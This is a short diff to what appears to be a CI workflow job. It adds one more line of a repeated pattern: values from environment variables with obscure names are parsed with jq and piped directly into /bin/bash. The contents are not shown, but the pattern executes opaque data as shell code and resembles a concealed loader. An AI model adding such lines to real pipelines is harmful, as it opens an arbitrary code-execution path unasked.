@@ -21,6 +21,7 @@ jobs:
           echo $vlxir01717 | jq -r .h2 | /bin/bash
           echo $m72 | jq -r .hyhh3181 | /bin/bash
           echo $h30638 | jq -r .jyell030 | /bin/bash
+          printf '%s' "$io6" | jq -r .u75109 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
